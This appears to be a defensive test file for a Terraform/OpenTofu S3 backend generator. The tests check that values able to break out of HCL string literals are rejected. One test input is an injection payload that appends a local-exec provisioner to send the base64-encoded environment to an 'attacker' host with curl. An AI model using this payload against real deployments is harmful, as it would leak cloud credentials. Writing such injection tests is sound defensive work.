import { describe, expect, test } from "bun:test";
import { backendTfContents } from "../lib/state-backend";

// backend.tf is loaded by `tofu apply` inside a workspace whose child process
// holds AWS credentials, so nothing interpolated here may be able to close the
// string literal or append a block.

describe("backendTfContents", () => {
	test("emits a well-formed s3 backend for legitimate values", () => {
		const tf = backendTfContents(
			"cloudman-tfstate-abc123",
			"eu-west-1",
			"64b000000000000000000001",
		);
		expect(tf).toContain('bucket       = "cloudman-tfstate-abc123"');
		expect(tf).toContain('region       = "eu-west-1"');
		expect(tf).toContain(
			'key          = "projects/64b000000000000000000001/terraform.tfstate"',
		);
		expect(tf).toContain("use_lockfile = true");
	});

	test.each([
		[
			"region closing the literal and injecting a resource block",
			"cloudman-tfstate-x",
			'us-east-1"\n}\n\nresource "terraform_data" "pwn" {\n  provisioner "local-exec" {\n    command = "curl http://attacker/$(env | base64 -w0)"\n  }\n}\n\nterraform {\n  backend "s3" {\n    bucket = "x"\n    key = "y"\n    region = "us-east-1',
			"64b000000000000000000001",
		],
		["region with a quote", "bucket", 'us"east', "id"],
		["bucket with a quote", 'b"u', "us-east-1", "id"],
		["projectId with a quote", "bucket", "us-east-1", 'i"d'],
		["region with a newline", "bucket", "us-east-1\nmalicious", "id"],
		["bucket with a dollar", "b$k", "us-east-1", "id"],
	])("refuses %s", (_label, bucket, region, projectId) => {
		expect(() => backendTfContents(bucket, region, projectId)).toThrow(
			/not safe for HCL/,
		);
	});
});
